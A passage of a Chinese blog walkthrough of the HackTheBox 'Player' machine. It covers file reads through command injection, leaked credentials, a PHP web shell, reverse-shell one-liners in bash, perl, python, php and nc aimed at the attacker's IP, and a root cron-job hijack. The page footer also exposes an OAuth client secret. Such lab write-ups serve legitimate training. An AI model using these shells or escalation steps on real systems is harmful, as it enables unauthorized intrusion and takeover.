+<p>参考：<a href="https://www.freebuf.com/vuls/217933.html" target="_blank" rel="noopener">CVE-2016-3116 Dropbear注入漏洞分析</a></p>
+<h2 id="readfile-本地文件读取"><a href="#readfile-本地文件读取" class="headerlink" title="readfile 本地文件读取"></a><strong>readfile 本地文件读取</strong></h2><p>readfile读取user.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.readfile /etc/passwd</span><br><span class="line">.readfile /home/telegen/user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-33-49.png" alt></p>
+<p>写文件反弹shell失败</p>
+<blockquote>
+<p>.writefile /tmp/testfile1 <code>thisisatestfile</code></p>
+</blockquote>
+<p>读取之前没能通过FFmpeg HLS漏洞读取成功的文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#&gt; .readfile /var/www/staging/fix.php                                    </span><br><span class="line">DEBUG:__main__:auth_cookie: &apos;xxxx\nsource /var/www/staging/fix.php\n&apos;          </span><br><span class="line">DEBUG:__main__:dummy exec returned: None</span><br><span class="line">INFO:__main__:&lt;?php       </span><br><span class="line">class                            </span><br><span class="line">protected                                          </span><br><span class="line">protected                                      </span><br><span class="line">protected                                      </span><br><span class="line">public                                       </span><br><span class="line">return                                          </span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if($result</span><br><span class="line">static::passed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">static::failed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if($result</span><br><span class="line">static::failed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">static::passed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if(!$username)&#123;</span><br><span class="line">$username</span><br><span class="line">$password</span><br><span class="line">&#125;</span><br><span class="line">//modified</span><br><span class="line">//for</span><br><span class="line">//fix</span><br><span class="line">//peter</span><br><span class="line">//CQXpm\z)G5D#%S$y=</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if($result</span><br><span class="line">static::passed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">static::failed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">echo</span><br><span class="line">static::$failed++;</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">static::character(&quot;.&quot;);</span><br><span class="line">static::$passed++;</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">echo</span><br><span class="line">static::$last_echoed</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">if(static::$last_echoed</span><br><span class="line">echo</span><br><span class="line">static::$last_echoed</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">#&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看到了账号信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">peter</span><br><span class="line">CQXpm\z)G5D#%S$y=</span><br></pre></td></tr></table></figure>
+
+<p>尝试登陆<code>http://dev.player.htb/</code></p>
+<p>登陆成功</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_17-45-47.png" alt></p>
+<h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><p>尝试着新建文件，但是无法新建成功。</p>
+<p>于是想再project新建一个工程看看在工程下能不能新建文件成功。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_18-08-51.png" alt></p>
+<p>失败，于是在<code>/var/www/demo/home</code>下新建project</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_18-04-59.png" alt></p>
+<p>上传文件test.php</p>
+<p>发现<code>http://dev.player.htb/</code>的子目录下同样的可以看到test.php</p>
+<p>wfuzz扫描<code>http://dev.player.htb/</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt http://dev.player.htb/FUZZ</span><br><span class="line"></span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/components (Status: 301)</span><br><span class="line">/data (Status: 301)</span><br><span class="line">/favicon.ico (Status: 200)</span><br><span class="line">/home (Status: 301)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/languages (Status: 301)</span><br><span class="line">/lib (Status: 301)</span><br><span class="line">/plugins (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/themes (Status: 301)</span><br></pre></td></tr></table></figure>
+
+<p>在home目录下可以看到test.php</p>
+<p>这时候可以上传一个反弹shell的脚本shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	$cmd = ($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line">	system($cmd);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">	<span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们在<code>http://dev.player.htb/home/shell.php?cmd=id</code>可以看到执行的命令</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_22-02-40.png" alt></p>
+<p>nc反弹shell</p>
+<p><a href="https://wh0ale.github.io/2019/02/19/2019-2-19-内网渗透tips②/">内网渗透tips②</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.15.142/4444 0&gt;&amp;1</span><br><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br><span class="line">php -r &apos;$sock=fsockopen(&quot;10.10.15.142&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>补充一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.142 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>直接在小马的参数里面执行反弹shell的命令没能反弹成功，然后上传大马</p>
+<p>这里用的家里的网，反弹shell 卡卡卡卡kkkkkkkk</p>
+<h1 id="Elevation"><a href="#Elevation" class="headerlink" title="Elevation"></a>Elevation</h1><p>wget下载<a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">pspy</a></p>
+<blockquote>
+<p>pspy是一种命令行工具，旨在无需root权限即可监听进程。它允许您在其他用户执行命令时查看它们，cron作业等。非常适合枚举CTF中的Linux系统。很好地向您的同事展示为什么在命令行中将秘密作为参数传递是一个坏主意。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_22-59-22.png" alt></p>
+<p>执行pspy时候遇到一些权限问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ /tmp/pspy64s</span><br><span class="line">/bin/sh: 8: /tmp/pspy64s: not found</span><br><span class="line">$ cp /var/www/demo/pspy64s /tmp/pspy64s</span><br><span class="line">$ /tmp/pspy64s</span><br><span class="line">/bin/sh: 10: /tmp/pspy64s: Permission denied</span><br><span class="line">$ chmod +x /tmp/pspy64s</span><br><span class="line">$ /tmp/pspy64s</span><br><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒</span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░</span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░</span><br><span class="line">                   ░           ░ ░</span><br><span class="line">                               ░ ░</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_23-04-41.png" alt></p>
+<p>可以看到一条重要信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020/01/29 20:37:01 CMD: UID=0    PID=20002  | /usr/bin/php /var/lib/playbuff/buff.php</span><br></pre></td></tr></table></figure>
+
+<p><code>/var/lib/playbuff/buff.php</code>是作为root权限执行的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">playBuff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $logFile=<span class="string">"/var/log/playbuff/logs.txt"</span>;</span><br><span class="line">	<span class="keyword">public</span> $logData=<span class="string">"Updated"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;logFile,<span class="keyword">$this</span>-&gt;logData);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$buff = <span class="keyword">new</span> playBuff();</span><br><span class="line">$serialbuff = serialize($buff);</span><br><span class="line">$data = file_get_contents(<span class="string">"/var/lib/playbuff/merge.log"</span>);</span><br><span class="line"><span class="keyword">if</span>(unserialize($data))</span><br><span class="line">&#123;</span><br><span class="line">	$update = file_get_contents(<span class="string">"/var/lib/playbuff/logs.txt"</span>);</span><br><span class="line">	$query = mysqli_query($conn, <span class="string">"update stats set status='$update' where id=1"</span>);</span><br><span class="line">	<span class="keyword">if</span>($query)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Success with serialized logs!'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	file_put_contents(<span class="string">"/var/lib/playbuff/merge.log"</span>,<span class="string">"no issues yet"</span>);</span><br><span class="line">	$update = file_get_contents(<span class="string">"/var/lib/playbuff/logs.txt"</span>);</span><br><span class="line">	$query = mysqli_query($conn, <span class="string">"update stats set status='$update' where id=1"</span>);</span><br><span class="line">	<span class="keyword">if</span>($query)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Success!'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然我们无法修改其中的文件内容，但是我们可以修改<code>/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;&quot;;</span><br><span class="line">$dbname = &quot;integrity&quot;;</span><br><span class="line"></span><br><span class="line">system(&quot;bash -c /tmp/pwned.sh&quot;);</span><br><span class="line"></span><br><span class="line">// Create connection</span><br><span class="line">$conn = new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">// Check connection</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>http://dev.player.htb/</code>上传文件pwned.sh，然后cp命令转移</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_23-47-18.png" alt></p>
+<p>然后kali监听就可以反弹shell了(root)，这里已经看到执行了<code>bash -c /tmp/pwned.sh</code>定时任务了</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-29_23-40-47.png" alt></p>
+<p>但是我一直等了好久都没能反弹成功</p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2020/01/28/hackthebox-Player/" title="hackthebox Player">https://wh0ale.github.io/2020/01/28/hackthebox-Player/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2020/01/17/DNS-over-HTTPS/" rel="next" title="DNS over HTTPS">
+                <i class="fa fa-chevron-left"></i> DNS over HTTPS
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">131</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#recon"><span class="nav-number">1.</span> <span class="nav-text">recon</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Enumeration"><span class="nav-number">1.1.</span> <span class="nav-text">Web Enumeration</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exploit"><span class="nav-number">2.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#FFmpeg-HLS漏洞–-gt-任意文件读取"><span class="nav-number">2.1.</span> <span class="nav-text">FFmpeg HLS漏洞–&gt;任意文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xauth-Command-Injection"><span class="nav-number">2.2.</span> <span class="nav-text">xauth Command Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#readfile-本地文件读取"><span class="nav-number">2.3.</span> <span class="nav-text">readfile 本地文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-shell"><span class="nav-number">2.4.</span> <span class="nav-text">Reverse shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Elevation"><span class="nav-number">3.</span> <span class="nav-text">Elevation</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">23:24</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
